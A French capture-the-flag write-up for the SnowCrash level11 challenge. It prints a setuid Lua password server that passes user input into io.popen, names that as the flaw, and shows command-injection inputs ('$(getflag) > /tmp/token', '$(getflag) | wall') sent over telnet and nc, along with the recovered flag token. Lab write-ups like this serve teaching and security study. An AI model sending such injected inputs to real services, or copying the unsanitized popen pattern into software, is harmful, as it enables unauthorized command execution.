```shell
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
level11@SnowCrash:~$ file level11.lua
level11.lua: setuid setgid a lua script, ASCII text executable
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
Ce code est écrit en Lua et il implémente un serveur simple qui écoute sur le port 5151 de l'adresse IP 127.0.0.1. Le serveur demande à l'utilisateur d'entrer un mot de passe, 
le hache en utilisant la fonction "hash", et le compare à une chaîne de hachage spécifique.

La fonction "hash" utilise le programme sha1sum pour calculer le hash SHA-1 du mot de passe entré par l'utilisateur. La fonction retourne la chaîne de hachage SHA-1 de longueur 40 caractères.

Le serveur est mis en boucle infinie avec une instruction "while 1 do". Pour chaque connexion client, il attend que l'utilisateur entre un mot de passe. Si le mot de passe entré correspond à la chaîne de hachage spécifique, le serveur envoie un message "Gz you dumb*" (félicitations, tu es idiot) au client, sinon, il envoie un message "Erf nope..\n" (désolé, mot de passe incorrect).

La faille est dans io.popen:
La fonction io.popen() en Lua est utilisée pour ouvrir un processus en mode lecture ou écriture. Elle prend en entrée une chaîne de caractères qui spécifie la commande à exécuter et le mode d'ouverture.

en mettant une commande getflag qui fait une sortie dans un fichier temporaire ça marche:
```shell
telnet localhost 5151
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: $(getflag) > /tmp/token
Erf nope..
Connection closed by foreign host.
level11@SnowCrash:~$ cat /tmp/token
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

ou 
```shell
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag) | wall
                                                                               
Broadcast Message from flag11@Snow                                             
        (somewhere) at 14:46 ...                                               
                                                                               
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s                      
                                                                               
Erf nope..
```
